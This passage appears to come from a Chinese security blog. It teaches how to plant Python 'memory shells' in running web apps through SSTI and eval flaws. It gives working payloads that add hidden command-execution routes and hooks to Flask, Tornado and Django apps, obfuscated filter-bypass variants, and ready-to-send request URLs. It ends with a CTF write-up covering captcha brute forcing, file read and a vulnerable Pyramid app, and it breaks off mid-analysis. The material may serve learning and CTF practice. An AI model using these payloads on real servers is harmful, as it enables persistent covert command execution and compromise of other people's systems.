is {a + b} and not {2 * (a + b)}.\u0026#39; \u0026#39;Five plus ten is 15 and not 30.\u0026#39; \u0026gt;\u0026gt;\u0026gt; f\u0026#39;{__import__(\u0026#34;os\u0026#34;).system(\u0026#34;id\u0026#34;)}\u0026#39; uid=0(root) gid=0(root) groups=0(root) \u0026#39;0\u0026#39; 更多参考这篇：Python 格式化字符串漏洞（Django为例） | 离别歌\n","date":"2025-04-16T00:00:00Z","image":"https://0d000721999.github.io/p/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1.png","permalink":"https://0d000721999.github.io/p/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/","title":"python格式化字符串漏洞"},{"content":"python内存马学习 常用的Python框架有Django、Flask, 这两者都可能存在SSTI漏洞. Python 内存马利用Flask框架中SSTI注入来实现, Flask框架中在web应用模板渲染的过程中用到render_template_string进行渲染, 但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现Python内存马的注入.\n老版flask内存马 Flask 请求上下文管理机制 当网页请求进入Flask时, 会实例化一个Request Context. 在Python中分出了两种上下文: 请求上下文(request context)、应用上下文(session context). 一个请求上下文中封装了请求的信息, 而上下文的结构是运用了一个Stack的栈结构, 也就是说它拥有一个栈所拥有的全部特性. request context实例化后会被push到栈_request_ctx_stack中, 基于此特性便可以通过获取栈顶元素的方法来获取当前的请求.\n漏洞环境 flask写SSTI-demo\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 from flask import Flask, request, render_template_string app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) def hello_world(): # put application\u0026#39;s code here person = \u0026#39;knave\u0026#39; if request.args.get(\u0026#39;name\u0026#39;): person = request.args.get(\u0026#39;name\u0026#39;) template = \u0026#39;\u0026lt;h1\u0026gt;Hi, %s.\u0026lt;/h1\u0026gt;\u0026#39; % person return render_template_string(template) if __name__ == \u0026#39;__main__\u0026#39;: app.run() 原始Flask内存马Payload:\n1 url_for.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#34;app.add_url_rule(\u0026#39;/shell\u0026#39;, \u0026#39;shell\u0026#39;, lambda :__import__(\u0026#39;os\u0026#39;).popen(_request_ctx_stack.top.request.args.get(\u0026#39;cmd\u0026#39;, \u0026#39;whoami\u0026#39;)).read())\u0026#34;,{\u0026#39;_request_ctx_stack\u0026#39;:url_for.__globals__[\u0026#39;_request_ctx_stack\u0026#39;],\u0026#39;app\u0026#39;:url_for.__globals__[\u0026#39;current_app\u0026#39;]}) payload分析 1 2 3 4 5 6 7 8 9 10 11 url_for.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;]( \u0026#34;app.add_url_rule( \u0026#39;/shell\u0026#39;, \u0026#39;shell\u0026#39;, lambda :__import__(\u0026#39;os\u0026#39;).popen(_request_ctx_stack.top.request.args.get(\u0026#39;cmd\u0026#39;, \u0026#39;whoami\u0026#39;)).read() )\u0026#34;, { \u0026#39;_request_ctx_stack\u0026#39;:url_for.__globals__[\u0026#39;_request_ctx_stack\u0026#39;], \u0026#39;app\u0026#39;:url_for.__globals__[\u0026#39;current_app\u0026#39;] } ) url_for是Flask的一个内置函数, 通过Flask内置函数可以调用其__globals__属性, 该特殊属性能够返回函数所在模块命名空间的所有变量, 其中包含了很多已经引入的modules, 可以看到这里是支持__builtins__的.\n在__builtins__模块中, Python在启动时就直接为我们导入了很多内建函数. 准确的说, Python在启动时会首先加载内建名称空间, 内建名称空间中有许多名字到对象之间的映射, 这些名字就是内建函数的名称, 对象就是这些内建函数对象. 可以看到, 在__builtins__模块的内建函数中是存在eval、exec等命令执行函数的.\n由于存在命令执行函数, 因此我们就可以直接调用命令执行函数来执行危险操作, Exploit如下:\n1 {{url_for.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;open -a Calculator\u0026#39;)\u0026#34;)}} 接着再来看看app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())这一截Payload. 这部分是动态添加了一条路由, 而处理该路由的函数是个由lambda关键字定义的匿名函数.\n在Flask中注册路由的时候是添加的@app.route()装饰器来实现的, 跟进查看其源码实现, 发现其调用了add_url_rule函数来添加路由.\nlambda即匿名函数, Payload中add_url_rule函数的第三个参数定义了一个lambda匿名函数, 其中通过os库的popen函数执行从Web请求中获取的cmd参数值并返回结果, 其中该参数值默认为whoami.\nsys.modules sys.modules是一个全局字典，该字典是python启动后就加载在内存中。每当程序员导入新的模块，sys.modules都将记录这些模块。字典sys.modules对于加载模块起到了缓冲的作用。当某个模块第一次导入，字典sys.modules将自动记录该模块。当第二次再导入该模块时，python会直接到字典中查找，从而加快了程序运行的速度。\n所以我们可以通过sys.modules拿到当前已经导入的模块，并且获取模块中的属性，由于我们最终的eval是在app.py中执行的，所以我们可以通过sys.modules['__main__']来获取当前的模块\n我们需要在非debug模式下才能成功添加后门路由\n1 2 3 import sys sys.modules[\u0026#39;__main__\u0026#39;].__dict__[\u0026#39;app\u0026#39;].debug=False sys.modules[\u0026#39;__main__\u0026#39;].__dict__[\u0026#39;app\u0026#39;].add_url_rule(\u0026#39;/shell\u0026#39;,\u0026#39;shell\u0026#39;,lambda :__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;dir\u0026#39;).read()) bypass方法 url_for可替换为get_flashed_messages或者request.__init__或者request.application. 代码执行函数替换, 如exec等替换eval. 字符串可采用拼接方式, 如['__builtins__']['eval']变为['__bui'+'ltins__']['ev'+'al']. __globals__可用__getattribute__('__globa'+'ls__')替换. []可用.__getitem__()或.pop()替换. 过滤{{或者}}, 可以使用{%或者%}绕过, {%%}中间可以执行if语句, 利用这一点可以进行类似盲注的操作或者外带代码执行结果. 过滤_可以用编码绕过, 如__class__替换成\\x5f\\x5fclass\\x5f\\x5f, 还可以用dir(0)[0][0]或者request['args']或者request['values']绕过. 过滤了.可以采用attr()或[]绕过. 其它的手法参考SSTI绕过过滤的方法即可 1 2 3 4 变形payload request.application.__self__._get_data_for_json.__getattribute__(\u0026#39;__globa\u0026#39;+\u0026#39;ls__\u0026#39;).__getitem__(\u0026#39;__bui\u0026#39;+\u0026#39;ltins__\u0026#39;).__getitem__(\u0026#39;ex\u0026#39;+\u0026#39;ec\u0026#39;)(\u0026#34;app.add_url_rule(\u0026#39;/h3rmesk1t\u0026#39;, \u0026#39;h3rmesk1t\u0026#39;, lambda :__import__(\u0026#39;os\u0026#39;).popen(_request_ctx_stack.top.request.args.get(\u0026#39;shell\u0026#39;, \u0026#39;calc\u0026#39;)).read())\u0026#34;,{\u0026#39;_request_ct\u0026#39;+\u0026#39;x_stack\u0026#39;:get_flashed_messages.__getattribute__(\u0026#39;__globa\u0026#39;+\u0026#39;ls__\u0026#39;).pop(\u0026#39;_request_\u0026#39;+\u0026#39;ctx_stack\u0026#39;),\u0026#39;app\u0026#39;:get_flashed_messages.__getattribute__(\u0026#39;__globa\u0026#39;+\u0026#39;ls__\u0026#39;).pop(\u0026#39;curre\u0026#39;+\u0026#39;nt_app\u0026#39;)}) get_flashed_messages|attr(\u0026#34;\\x5f\\x5fgetattribute\\x5f\\x5f\u0026#34;)(\u0026#34;\\x5f\\x5fglobals\\x5f\\x5f\u0026#34;)|attr(\u0026#34;\\x5f\\x5fgetattribute\\x5f\\x5f\u0026#34;)(\u0026#34;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#34;)(\u0026#34;__builtins__\u0026#34;)|attr(\u0026#34;\\x5f\\x5fgetattribute\\x5f\\x5f\u0026#34;)(\u0026#34;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#34;)(\u0026#34;\\u0065\\u0076\\u0061\\u006c\u0026#34;)(\u0026#34;app.add_ur\u0026#34;+\u0026#34;l_rule(\u0026#39;/h3rmesk1t\u0026#39;, \u0026#39;h3rmesk1t\u0026#39;, la\u0026#34;+\u0026#34;mbda :__imp\u0026#34;+\u0026#34;ort__(\u0026#39;o\u0026#34;+\u0026#34;s\u0026#39;).po\u0026#34;+\u0026#34;pen(_request_c\u0026#34;+\u0026#34;tx_stack.to\u0026#34;+\u0026#34;p.re\u0026#34;+\u0026#34;quest.args.get(\u0026#39;shell\u0026#39;)).re\u0026#34;+\u0026#34;ad())\u0026#34;,{\u0026#39;\\u005f\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u005f\\u0063\\u0074\\u0078\\u005f\\u0073\\u0074\\u0061\\u0063\\u006b\u0026#39;:get_flashed_messages|attr(\u0026#34;\\x5f\\x5fgetattribute\\x5f\\x5f\u0026#34;)(\u0026#34;\\x5f\\x5fglobals\\x5f\\x5f\u0026#34;)|attr(\u0026#34;\\x5f\\x5fgetattribute\\x5f\\x5f\u0026#34;)(\u0026#34;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#34;)(\u0026#34;\\u005f\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u005f\\u0063\\u0074\\u0078\\u005f\\u0073\\u0074\\u0061\\u0063\\u006b\u0026#34;),\u0026#39;app\u0026#39;:get_flashed_messages|attr(\u0026#34;\\x5f\\x5fgetattribute\\x5f\\x5f\u0026#34;)(\u0026#34;\\x5f\\x5fglobals\\x5f\\x5f\u0026#34;)|attr(\u0026#34;\\x5f\\x5fgetattribute\\x5f\\x5f\u0026#34;)(\u0026#34;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#34;)(\u0026#34;\\u0063\\u0075\\u0072\\u0072\\u0065\\u006e\\u0074\\u005f\\u0061\\u0070\\u0070\u0026#34;)}) 新版flask内存马 参考：新版FLASK下python内存马的研究 - gxngxngxn - 博客园\n在最新版本的Flask中，如果直接使用这个payload会发现将抛出一个异常。\n但是可以利用@app.before_request @app.after_request方法来打\nbefore_request 我们每次发起请求之前，就会调用这个方法，触发里面定义的函数\n里面调用了\n1 before_request_funcs.setdefault(None, []).append(f) 然后f就是访问值，也是我们可以自定义的，那么这里只要我们设置f为一个匿名函数，类似之前\n1 lambda :__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read() payload\n1 eval(\u0026#34;__import__(\u0026#39;sys\u0026#39;).modules[\u0026#39;__main__\u0026#39;].__dict__[\u0026#39;app\u0026#39;].before_request_funcs.setdefault(None,[]).append(lambda :__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;dir\u0026#39;).read())\u0026#34;) after_request 这个是在请求完成后调用，需要注意的是这个是需要定义一个返回值的，不然就报错。\n参考这个：Python Flask内存马的另辟途径-先知社区\nself.after_request_funcs.setdefault(None, []).append(f)传入的f就是对应的自定义函数，但这里的f需要接收一个response对象，同时返回一个response对象。\n但我们仅通过lamba无法对原始传进来的response进行修改后再返回，所以需要重新生成一个response对象，然后再返回这个response。\npayload\n1 eval(\u0026#34;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(\u0026#39;cmd\u0026#39;) and exec(\\\u0026#34;global CmdResp;CmdResp=__import__(\\\u0026#39;flask\\\u0026#39;).make_response(__import__(\\\u0026#39;os\\\u0026#39;).popen(request.args.get(\\\u0026#39;cmd\\\u0026#39;)).read())\\\u0026#34;)==None else resp)\u0026#34;) 还找到了其他钩子函数\nerrorhandler 这个函数可以用于自定义404页面的回显\n跟进register_error_handler函数,\ncode_or_exception和f就是之前的那两个参数，如果我们绕过上面的register_error_handler函数，对这里的函数进行控制，一样可以达到我们的目的。\n而code和f是我们比较方便可以手动构造的，但是exc_class不太好我们自己构造，我们看到这两个变量是通过_get_exc_class_and_code函数获取的，这个函数的参数code_or_exception就是我们之前传的404，那我们就依靠这个来获取变量值，然后覆写图中这两个函数即可\npayload\n1 exec(\u0026#34;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(\u0026#39;os\u0026#39;).popen(request.args.get(\u0026#39;gxngxngxn\u0026#39;)).read()\u0026#34;) 前面提到新版没办法用老版的payload是会抛出错误\n还是利用add_url_rule 回头看add_url_rule函数\n1 2 3 4 5 6 7 8 9 10 11 12 rule_obj = self.url_rule_class(rule, methods=methods, **options) rule_obj.provide_automatic_options = provide_automatic_options self.url_map.add(rule_obj) if view_func is not None: old_func = self.view_functions.get(endpoint) if old_func is not None and old_func != view_func: raise AssertionError( \u0026#34;View function mapping is overwriting an existing\u0026#34; f\u0026#34; endpoint function: {endpoint}\u0026#34; ) self.view_functions[endpoint] = view_func 发现在函数末尾的处理中，将 rule_obj 对象添加到了 url_map 中，之后将 view_func 作为了 view_functions 字典中 endpoint 键的值，所以理论上来讲，可以通过直接操作这两个变量来完成一次手动的 add_url_rule\nurl_map 和 view_functions 的定义如下：\n1 2 3 4 url_map_class = Map self.view_functions: dict[str, ft.RouteCallable] = {} self.url_map = self.url_map_class(host_matching=host_matching) 漏洞环境\n1 2 3 4 5 6 7 8 9 10 11 12 from flask import Flask, request app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) def calc(): result = eval(request.args.get(\u0026#39;expression\u0026#39;)) template = \u0026#39;\u0026lt;h2\u0026gt;result: %s!\u0026lt;/h2\u0026gt;\u0026#39; % result return template if __name__ == \u0026#34;__main__\u0026#34;: app.run(debug=True) 在 eval 场景下，没有办法执行多条代码，所以这里需要发送两条请求来完成操作，当前上下文中可以直接使用 app 对象，构造第一条请求向 url_map 中新增一条 UrlRule\n1 app.url_map.add(app.url_rule_class(\u0026#39;/flask-shell\u0026#39;, methods=[\u0026#39;GET\u0026#39;],endpoint=\u0026#39;shell\u0026#39;)) 这个时候已经可以访问 /flask-shell 路由，但是由于 view_functions 中并不存在路由指定的 endpoint 所以会报错。\n之后再构造第二条请求，向 view_functions 中增加对应 endpoint 的实现。\n1 app.view_functions.update({\u0026#39;shell\u0026#39;: lambda:__import__(\u0026#39;os\u0026#39;).popen(request_context.top.request.args.get(\u0026#39;cmd\u0026#39;, \u0026#39;whoami\u0026#39;)).read()}) 为了灵活性这里需要http传参来控制执行的命令，但是这里会发现上下文中并不存在 request_context，当前 app 对象中的 request_context 是一个函数。\n那么可以通过函数的 __globals__ 属性来获取当前的全局变量字典，在这其中就有需要的 RequestContext 对象。\n所以最终payload\n1 app.view_functions.update({\u0026#39;shell\u0026#39;: lambda:__import__(\u0026#39;os\u0026#39;).popen(app.request_context.__globals__[\u0026#39;request_ctx\u0026#39;].request.args.get(\u0026#39;cmd\u0026#39;, \u0026#39;whoami\u0026#39;)).read()}) 将两条payload发送完成后，即可新增一条任意命令执行的路由 /flask-shell\nTornado 参考：Python Web 内存马多框架植入技术详解 | 天工实验室\n漏洞环境\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import tornado class MainHandler(tornado.web.RequestHandler): def get(self): result = eval(self.get_argument(\u0026#39;expression\u0026#39;)) self.write(\u0026#39;\u0026lt;h2\u0026gt;result: %s!\u0026lt;/h2\u0026gt;\u0026#39; % result) def make_app(): return tornado.web.Application([ (r\u0026#34;/\u0026#34;, MainHandler), ], debug=True, autoreload=True) if __name__ == \u0026#39;__main__\u0026#39;: app = make_app() app.listen(5000) print(\u0026#34;listen: 5000\u0026#34;) tornado.ioloop.IOLoop.instance().start() Tornado 的路由一般情况下都会在实例化 tornado.web.Application 的时候传入，最初想到的办法和 flask 相同，考虑是否能找到其中存放路由的列表来直接操作，在阅读 Application 的代码时确实发现在构造函数中存在这样的列表。\n1 2 3 4 5 6 7 8 9 10 11 def __init__( self, handlers: Optional[_RuleList] = None, default_host: Optional[str] = None, transforms: Optional[List[Type[\u0026#34;OutputTransform\u0026#34;]]] = None, **settings: Any, ) -\u0026gt; None: self.wildcard_router = _ApplicationRouter(self, handlers) self.default_router = _ApplicationRouter( self, [Rule(AnyMatches(), self.wildcard_router)] ) 发现在 Application 类中存在一个类似于 flask 中 add_url_rule 的函数 add_handlers，这个函数用来支持配置虚拟主机，并且在之后会将指定的路由加入当前的路由表中。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 def add_handlers(self, host_pattern: str, host_handlers: _RuleList) -\u0026gt; None: \u0026#34;\u0026#34;\u0026#34;Appends the given handlers to our handler list. Host patterns are processed sequentially in the order they were added. All matching patterns will be considered. \u0026#34;\u0026#34;\u0026#34; host_matcher = HostMatches(host_pattern) rule = Rule(host_matcher, _ApplicationRouter(self, host_handlers)) self.default_router.rules.insert(-1, rule) if self.default_host is not None: self.wildcard_router.add_rules( [(DefaultHostMatches(self, host_matcher.host_pattern), host_handlers)] ) def add_rules(self, rules: _RuleList) -\u0026gt; None: \u0026#34;\u0026#34;\u0026#34;Appends new rules to the router. :arg rules: a list of Rule instances (or tuples of arguments, which are passed to Rule constructor). \u0026#34;\u0026#34;\u0026#34; for rule in rules: if isinstance(rule, (tuple, list)): assert len(rule) in (2, 3, 4) if isinstance(rule[0], basestring_type): rule = Rule(PathMatches(rule[0]), *rule[1:]) else: rule = Rule(*rule) self.rules.append(self.process_rule(rule)) 参数构造\n首先看到这个函数声明接受两个参数 host_pattern 和 host_handlers，其中 host_pattern 是一个字符串没有什么需要多考虑的，这个场景下直接构造 .* 匹配所有域名即可，而第二个参数 host_handlers 较为复杂一点，类型为 _RuleList，查看一下这个类型定义。\n1 2 3 4 5 6 7 8 9 _RuleList = List[ Union[ \u0026#34;Rule\u0026#34;, List[Any], # Can\u0026#39;t do detailed typechecking of lists. Tuple[Union[str, \u0026#34;Matcher\u0026#34;], Any], Tuple[Union[str, \u0026#34;Matcher\u0026#34;], Any, Dict[str, Any]], Tuple[Union[str, \u0026#34;Matcher\u0026#34;], Any, Dict[str, Any], str], ] ] 在 add_rules 中，整个传入的值都会被作为构造参数来实例化一个 Rule 对象，构造函数如下：\n1 2 3 4 5 6 7 def __init__( self, matcher: \u0026#34;Matcher\u0026#34;, target: Any, target_kwargs: Optional[Dict[str, Any]] = None, name: Optional[str] = None, ) -\u0026gt; None: 第一个参数类型为 Matcher，如果自己来构造的话会比较麻烦，但是看到 add_rules 中的处理，会判断一次传入值，如果是 tuple 或者 list 并且第一个值是字符串，那么就会调用一次 PathMatches 返回一个 Matcher 对象，所以这里考虑直接传入路由字符串，让系统来做一次自动转换。\n接下来考虑路由对应的 handler, 这往往需要是一个 tornado.web.RequestHandler 的子类，那么这里可以直接使用 type 函数来创建一个对应基类的对象，当 type 函数接受三个参数时，第一个参数为类名，第二个参数为基类元组，第三个参数为类属性/方法的字典，函数原型如下：\n1 2 @overload def __init__(self, name: str, bases: tuple[type, ...], dict: dict[str, Any], /, **kwds: Any) -\u0026gt; None: ... 所以使用下面的payload即可创建一个合法 RequestHandler。\n1 2 3 4 5 6 7 type( \u0026#39;ShellHandler\u0026#39;, (tornado.web.RequestHandler,), { \u0026#39;get\u0026#39;: lambda self: self.write(__import__(\u0026#39;os\u0026#39;).popen(sef.get_argument(\u0026#39;cmd\u0026#39;, \u0026#39;id\u0026#39;)).read()) } ) 将所有分析结合起来，即可在当前场景下构造出下面的请求payload。\n1 http://127.0.0.1:5000/?expression=self.application.add_handlers(\u0026#39;.*\u0026#39;, [\u0026#39;/tornado-shell\u0026#39;, type(\u0026#39;ShellHandler\u0026#39;, (tornado.web.RequestHandler,), {\u0026#39;get\u0026#39;: lambda self: self.write(__import__(\u0026#39;os\u0026#39;).popen(self.get_argument(\u0026#39;cmd\u0026#39;, \u0026#39;id\u0026#39;)).read())})]) 之后便可以访问 /tornado-shell 来执行任意系统命令。\nDjango 漏洞代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # memshell/urls.py from django.contrib import admin from django.urls import path from .views import calc urlpatterns = [ path(\u0026#39;admin/\u0026#39;, admin.site.urls), path(\u0026#39;calc\u0026#39;, calc) ] # memshell/views.py from django.http import HttpResponse def calc(request): result = eval(request.GET.get(\u0026#39;expression\u0026#39;)) return HttpResponse(\u0026#39;\u0026lt;h2\u0026gt;result: %s!\u0026lt;/h2\u0026gt;\u0026#39; % result) 虽然 Django 的代码结构不太相同，但由于所有路由都定义在 app/urls.py#urlpatterns 中，所以大体思路没有什么差别，首先考虑如何获取到这个列表，然后再进行操作。\n在 Django 中，root app下会有一个 settings.py 文件用于定义应用配置，其中 ROOT_URLCONF 指定了当前应用路由入口，在当前场景下的 ROOT_URLCONF 为：\n1 ROOT_URLCONF = \u0026#39;memshell.urls\u0026#39; 首先考虑如何获取到 settings 这个对象，得益于当前场景下可以使用 request，所以使用其中函数的 __globals__ 属性来获取到当前的全局变量字典，其中就可以找到。\n1 /calc?expression=request.get_post.__globals__ 找到memshell.settings\nimport导入就能获取到app\n1 /calc?expression=__import__(request.get_post.__globals__[\u0026#34;settings\u0026#34;].ROOT_URLCONF) 获取到app就能获取urlpatterns来操作路由列表了\n1 /calc?expression=__import__(request.get_post.__globals__[\u0026#34;settings\u0026#34;].ROOT_URLCONF).urls.urlpatterns 在路由定义中，每一条路由都会调用 path 函数来进行定义，传入的参数相对也比较简单，就是 路由：函数 的对应，第一个路由参数不需要考虑，传入字符串即可，需要考虑的是如何构造第二个参数，查看 path 函数定义。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 def _path(route, view, kwargs=None, name=None, Pattern=None): from django.views import View if kwargs is not None and not isinstance(kwargs, dict): raise TypeError( f\u0026#34;kwargs argument must be a dict, but got {kwargs.__class__.__name__}.\u0026#34; ) if isinstance(view, (list, tuple)): # For include(...) processing. pattern = Pattern(route, is_endpoint=False) urlconf_module, app_name, namespace = view return URLResolver( pattern, urlconf_module, kwargs, app_name=app_name, namespace=namespace, ) elif callable(view): pattern = Pattern(route, name=name, is_endpoint=True) return URLPattern(pattern, view, kwargs, name) elif isinstance(view, View): view_cls_name = view.__class__.__name__ raise TypeError( f\u0026#34;view must be a callable, pass {view_cls_name}.as_view(), not \u0026#34; f\u0026#34;{view_cls_name}().\u0026#34; ) else: raise TypeError( \u0026#34;view must be a callable or a list/tuple in the case of include().\u0026#34; ) 其中会发现 view 参数除了判断是否为 View、(list, tuple) 之外，还判断了是否是一个可调用对象，那么这里就比较简单了，直接构造一个 lambda 函数即可。\n根据之前的分析结果，可以得到下面的构造流程：\n获取app.urlpatterns\n1 __import__(request.get_port.__globals__[\u0026#34;settings\u0026#34;].ROOT_URLCONF).urls.urlpatterns 调用path函数，返回一条新路由\n1 __import__(\u0026#39;django\u0026#39;).urls.path(\u0026#39;shell\u0026#39;,lambda request: __import__(\u0026#39;django\u0026#39;).http.HttpResponse(__import__(\u0026#39;os\u0026#39;).popen(request.GET.get(\u0026#39;cmd\u0026#39;,\u0026#39;id\u0026#39;)).read())) 当前场景下需要返回一个 http.HttpResponse，所以需要额外引入 django 来进行调用\n将新路由append到app.urlpatterns中实现内存马\n1 http://localhost:8000/calc?expression=__import__(request.get_port.__globals__[\u0026#34;settings\u0026#34;].ROOT_URLCONF).urls.urlpatterns.append(__import__(\u0026#39;django\u0026#39;).urls.path(\u0026#39;shell\u0026#39;,lambda request: __import__(\u0026#39;django\u0026#39;).http.HttpResponse(__import__(\u0026#39;os\u0026#39;).popen(request.GET.get(\u0026#39;cmd\u0026#39;,\u0026#39;id\u0026#39;)).read()))) 然后访问/shell\npyramid 直接上例题\n第一届国城杯ez_Gallery 上来先是弱口令爆破，有验证码\n下面用bp插件来爆破\nxiapao 使用参考：全网最新、最详细的使用burpsuite验证码识别绕过爆破教程（2023最新）_burpsuite绕过验证码-CSDN博客\n填入链接为验证码图片链接，然后开启本地验证码识别服务\n然后把验证码位置替换为 @xiapao@1@\n最后在把线程设为 1 就能开始爆破了\n接下来就是任意文件读取\n直接读app.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 import jinja2 from pyramid.config import Configurator from pyramid.httpexceptions import HTTPFound from pyramid.response import Response from pyramid.session import SignedCookieSessionFactory from wsgiref.simple_server import make_server from Captcha import captcha_image_view, captcha_store import re import os class User: def __init__(self, username, password): self.username = username self.password = password users = {\u0026#34;admin\u0026#34;: User(\u0026#34;admin\u0026#34;, \u0026#34;123456\u0026#34;)} def root_view(request): # 重定向到 /login return HTTPFound(location=\u0026#39;/login\u0026#39;) def info_view(request): # 查看细节内容 if request.session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return Response(\u0026#34;请先登录\u0026#34;, status=403) file_name = request.params.get(\u0026#39;file\u0026#39;) file_base, file_extension = os.path.splitext(file_name) if file_name: file_path = os.path.join(\u0026#39;/app/static/details/\u0026#39;, file_name) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() print(content) except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; else: content = \u0026#34;未提供文件名。\u0026#34; return {\u0026#39;file_name\u0026#39;: file_name, \u0026#39;content\u0026#39;: content, \u0026#39;file_base\u0026#39;: file_base} def home_view(request): # 主路由 if request.session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return Response(\u0026#34;请先登录\u0026#34;, status=403) detailtxt = os.listdir(\u0026#39;/app/static/details/\u0026#39;) picture_list = [i[:i.index(\u0026#39;.\u0026#39;)] for i in detailtxt] file_contents = {} for picture in picture_list: with open(f\u0026#34;/app/static/details/{picture}.txt\u0026#34;, \u0026#34;r\u0026#34;, encoding=\u0026#39;utf-8\u0026#39;) as f: file_contents[picture] = f.read(80) return {\u0026#39;picture_list\u0026#39;: picture_list, \u0026#39;file_contents\u0026#39;: file_contents} def login_view(request): if request.method == \u0026#39;POST\u0026#39;: username = request.POST.get(\u0026#39;username\u0026#39;) password = request.POST.get(\u0026#39;password\u0026#39;) user_captcha = request.POST.get(\u0026#39;captcha\u0026#39;, \u0026#39;\u0026#39;).upper() if user_captcha != captcha_store.get(\u0026#39;captcha_text\u0026#39;, \u0026#39;\u0026#39;): return Response(\u0026#34;验证码错误，请重试。\u0026#34;) user = users.get(username) if user and user.password == password: request.session[\u0026#39;username\u0026#39;] = username return Response(\u0026#34;登录成功！\u0026amp;lt;a href=\u0026#39;/home\u0026#39;\u0026amp;gt;点击进入主页\u0026amp;lt;/a\u0026amp;gt;\u0026#34;) else: return Response(\u0026#34;用户名或密码错误。\u0026#34;) return {} def shell_view(request): if request.session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return Response(\u0026#34;请先登录\u0026#34;, status=403) expression = request.GET.get(\u0026#39;shellcmd\u0026#39;, \u0026#39;\u0026#39;) blacklist_patterns = [r\u0026#39;.*length.*\u0026#39;,r\u0026#39;.*count.*\u0026#39;,r\u0026#39;.*[0-9].*\u0026#39;,r\u0026#39;.*\\..*\u0026#39;,r\u0026#39;.*soft.*\u0026#39;,r\u0026#39;.*%.*\u0026#39;] if any(re.search(pattern, expression) for pattern in blacklist_patterns): return Response(\u0026#39;wafwafwaf\u0026#39;) try: result = jinja2.Environment(loader=jinja2.BaseLoader()).from_string(expression).render({\u0026#34;request\u0026#34;: request}) if result != None: return Response(\u0026#39;success\u0026#39;) else: return Response(\u0026#39;error\u0026#39;) except Exception as e: return Response(\u0026#39;error\u0026#39;) def main(): session_factory = SignedCookieSessionFactory(\u0026#39;secret_key\u0026#39;) with Configurator(session_factory=session_factory) as config: config.include(\u0026#39;pyramid_chameleon\u0026#39;) # 添加渲染模板 config.add_static_view(name=\u0026#39;static\u0026#39;, path=\u0026#39;/app/static\u0026#39;) config.set_default_permission(\u0026#39;view\u0026#39;) # 设置默认权限为view # 注册路由 config.add_route(\u0026#39;root\u0026#39;, \u0026#39;/\u0026#39;) config.add_route(\u0026#39;captcha\u0026#39;, \u0026#39;/captcha\u0026#39;) config.add_route(\u0026#39;home\u0026#39;, \u0026#39;/home\u0026#39;) config.add_route(\u0026#39;info\u0026#39;, \u0026#39;/info\u0026#39;) config.add_route(\u0026#39;login\u0026#39;, \u0026#39;/login\u0026#39;) config.add_route(\u0026#39;shell\u0026#39;, \u0026#39;/shell\u0026#39;) # 注册视图 config.add_view(root_view, route_name=\u0026#39;root\u0026#39;) config.add_view(captcha_image_view, route_name=\u0026#39;captcha\u0026#39;) config.add_view(home_view, route_name=\u0026#39;home\u0026#39;, renderer=\u0026#39;home.pt\u0026#39;, permission=\u0026#39;view\u0026#39;) config.add_view(info_view, route_name=\u0026#39;info\u0026#39;, renderer=\u0026#39;details.pt\u0026#39;, permission=\u0026#39;view\u0026#39;) config.add_view(login_view, route_name=\u0026#39;login\u0026#39;, renderer=\u0026#39;login.pt\u0026#39;) config.add_view(shell_view, route_name=\u0026#39;shell\u0026#39;, renderer=\u0026#39;string\u0026#39;, permission=\u0026#39;view\u0026#39;) config.scan() app = config.make_wsgi_app() return app if __name__ == \u0026#34;__main__\u0026#34;: app = main() server = make_server(\u0026#39;0.0.0.0\u0026#39;, 6543, app) server.serve_forever() 看到shell路由存在ssti漏洞但是无回显\n添加路由视图用到 config.add_view，我们可以查看config的所有变量\n找到\n1 \u0026#39;add_exception_view\u0026#39;, \u0026#39;add_forbidden_view\u0026#39;, \u0026#39;add_notfound_view\u0026#39; 